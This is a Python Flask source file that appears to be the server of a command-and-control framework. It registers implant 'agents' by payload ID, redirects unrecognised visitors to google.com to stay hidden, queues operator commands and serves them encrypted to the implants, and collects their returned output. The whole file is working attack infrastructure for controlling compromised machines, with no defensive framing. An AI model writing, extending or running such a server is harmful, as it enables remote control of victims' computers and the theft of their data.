from flask import Flask, request, redirect
from functions import *
import base64


app = Flask(__name__)

@app.route('/admin', methods=['POST'])
def admin():
    data = request.json
    if request.method == 'POST':
        uuid = data.get('uuid')
        cmd = data.get('command')
        r.rpush(uuid, cmd)
        if r.llen(uuid) > 100:
            r.lpop(uuid)
    return "Command Sent!"

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    b64user = base64.b64decode(data.get('user'))
    b64uuid = base64.b64decode(data.get('uuid'))
    b64cid = base64.b64decode(data.get("data"))
    uuid = b64uuid.decode('utf-8')
    user = b64user.decode('utf-8')
    compile_id = b64cid.decode('utf-8')
    profile = request.headers.get("Sec-Purpose")
    hostname = request.headers.get("X-Forwarded-Host")
    ip = request.headers.get("X-Real-IP")
    with engine.begin() as conn:
        sql_select = text("SELECT compile_id FROM payloads WHERE compile_id = :compile_id")
        tmp = conn.execute(sql_select, {"compile_id": compile_id})
        result = tmp.fetchall()

    if not result:
        return redirect("https://www.google.com") # Change redirect as needed
    
    if r.exists(uuid) == 0:
        result = register_agent(uuid, profile, ip, hostname, user, compile_id)

        # base64 encode data
        byte_key = result[0].encode('utf-8')
        byte_iv = result[1].encode('utf-8')
        key = base64.b64encode(byte_key)
        iv = base64.b64encode(byte_iv)
        command = {"data": key.decode('utf-8'), "param": iv.decode('utf-8')}
        return command
    else:
        command = {"data": "", "param": ""}
        return command

@app.route('/callback', methods=['GET', 'POST'])
def callback():
    if request.method == 'GET':
        b64uuid = base64.b64decode(request.args.get("uuid"))
        uuid = b64uuid.decode('utf-8')
        keys = get_keys(uuid)   # AES encrypt

        cache = r.lindex(uuid, -1)
        if "SEEN" in cache or "AGENT REGISTERED" in cache:
            update_seen(uuid)
            if keys:
                enc_command = aes_encrypt(b"", keys[0], keys[1])
                enc_param = aes_encrypt(b"", keys[0], keys[1])
                command = {"data": enc_command, "param": enc_param}
            else:
                command = {"data": "", "param": ""}
        else:
            cmd = cache.split(' ', 1)
            if len(cmd) > 1:
                param = cmd[1]
            else:
                param = ""
            update_seen(uuid)
            r.rpush(uuid, "SEEN")
            small_check(uuid)

            if keys:
                enc_command = aes_encrypt(cmd[0].encode('utf-8'), keys[0], keys[1])
                enc_param = aes_encrypt(param.encode('utf-8'), keys[0], keys[1])
                command = {"data": enc_command, "param": enc_param}
            else:
                byte_cmd = cmd[0].encode('utf-8')
                byte_param = param.encode('utf-8')
                b64cmd = base64.b64encode(byte_cmd)
                b64param = base64.b64encode(byte_param)
                command = {"data": b64cmd.decode('utf-8'), "param": b64param.decode('utf-8')}

        return command

    elif request.method == 'POST':
        data = request.json
        b64uuid = base64.b64decode(data.get("uuid"))
        uuid = b64uuid.decode('utf-8')
        aes_keys = get_keys(uuid)
        if aes_keys == None:
            b64data = base64.b64decode(data.get("data"))
            data = b64data.decode('utf-8')
        else:
            data = aes_decrypt(data.get("data"), aes_keys[0], aes_keys[1])

        key = f"{uuid}-output"
        if uuid and data:
            r.publish(key, data)
        else:
            r.publish(key, "Data failed to be decrypted (AES issue?)\n")
        return "Success"
    else:
        return "Invalid Method"


# This allows you to run the app directly with `python app.py`
if __name__ == '__main__':
    app.run(debug=True)